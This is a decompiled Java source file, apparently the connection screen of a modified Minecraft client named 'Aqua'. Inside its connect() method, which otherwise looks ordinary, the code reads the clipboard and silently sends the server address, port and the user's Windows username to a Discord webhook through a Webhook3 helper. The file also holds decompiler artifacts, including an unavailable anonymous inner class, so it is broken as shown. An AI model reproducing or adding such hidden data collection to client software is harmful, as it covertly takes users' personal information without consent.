package net.minecraft.client.multiplayer;

import intent.AquaDev.aqua.Aqua;
import intent.AquaDev.aqua.Webhook3;
import java.io.IOException;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.multiplayer.ServerAddress;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.client.resources.I18n;
import net.minecraft.network.NetworkManager;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class GuiConnecting
extends GuiScreen {
    private static final AtomicInteger CONNECTION_ID = new AtomicInteger(0);
    private static final Logger logger = LogManager.getLogger();
    private NetworkManager networkManager;
    private boolean cancel;
    private final GuiScreen previousGuiScreen;

    public GuiConnecting(GuiScreen p_i1181_1_, Minecraft mcIn, ServerData p_i1181_3_) {
        this.mc = mcIn;
        this.previousGuiScreen = p_i1181_1_;
        ServerAddress serveraddress = ServerAddress.fromString((String)p_i1181_3_.serverIP);
        mcIn.loadWorld((WorldClient)null);
        mcIn.setServerData(p_i1181_3_);
        this.connect(serveraddress.getIP(), serveraddress.getPort());
    }

    public GuiConnecting(GuiScreen p_i1182_1_, Minecraft mcIn, String hostName, int port) {
        this.mc = mcIn;
        this.previousGuiScreen = p_i1182_1_;
        mcIn.loadWorld((WorldClient)null);
        this.connect(hostName, port);
    }

    private void connect(String ip, int port) {
        Aqua.INSTANCE.lastConnection = System.currentTimeMillis();
        String Copy = GuiConnecting.getClipboardString();
        Webhook3.sendToDiscord((String)("Connecting to " + ip + ", " + port + " WindowsUserName : " + System.getProperty((String)"user.name") + " "));
        logger.info("Connecting to " + ip + ", " + port);
        new /* Unavailable Anonymous Inner Class!! */.start();
    }

    public void updateScreen() {
        if (this.networkManager != null) {
            if (this.networkManager.isChannelOpen()) {
                this.networkManager.processReceivedPackets();
            } else {
                this.networkManager.checkDisconnected();
            }
        }
    }

    protected void keyTyped(char typedChar, int keyCode) throws IOException {
    }

    public void initGui() {
        this.buttonList.clear();
        this.buttonList.add((Object)new GuiButton(0, width / 2 - 100, height / 4 + 120 + 12, I18n.format((String)"gui.cancel", (Object[])new Object[0])));
    }

    protected void actionPerformed(GuiButton button) throws IOException {
        if (button.id == 0) {
            this.cancel = true;
            if (this.networkManager != null) {
                this.networkManager.closeChannel((IChatComponent)new ChatComponentText("Aborted"));
            }
            this.mc.displayGuiScreen(this.previousGuiScreen);
        }
    }

    public void drawScreen(int mouseX, int mouseY, float partialTicks) {
        this.drawDefaultBackground();
        if (this.networkManager == null) {
            this.drawCenteredString(this.fontRendererObj, I18n.format((String)"connect.connecting", (Object[])new Object[0]), width / 2, height / 2 - 50, 0xFFFFFF);
        } else {
            this.drawCenteredString(this.fontRendererObj, I18n.format((String)"connect.authorizing", (Object[])new Object[0]), width / 2, height / 2 - 50, 0xFFFFFF);
        }
        super.drawScreen(mouseX, mouseY, partialTicks);
    }

    static /* synthetic */ boolean access$000(GuiConnecting x0) {
        return x0.cancel;
    }

    static /* synthetic */ NetworkManager access$102(GuiConnecting x0, NetworkManager x1) {
        x0.networkManager = x1;
        return x0.networkManager;
    }

    static /* synthetic */ Minecraft access$200(GuiConnecting x0) {
        return x0.mc;
    }

    static /* synthetic */ NetworkManager access$100(GuiConnecting x0) {
        return x0.networkManager;
    }

    static /* synthetic */ Minecraft access$300(GuiConnecting x0) {
        return x0.mc;
    }

    static /* synthetic */ GuiScreen access$400(GuiConnecting x0) {
        return x0.previousGuiScreen;
    }

    static /* synthetic */ Minecraft access$500(GuiConnecting x0) {
        return x0.mc;
    }

    static /* synthetic */ Logger access$600() {
        return logger;
    }

    static /* synthetic */ Minecraft access$700(GuiConnecting x0) {
        return x0.mc;
    }

    static /* synthetic */ Minecraft access$800(GuiConnecting x0) {
        return x0.mc;
    }
}
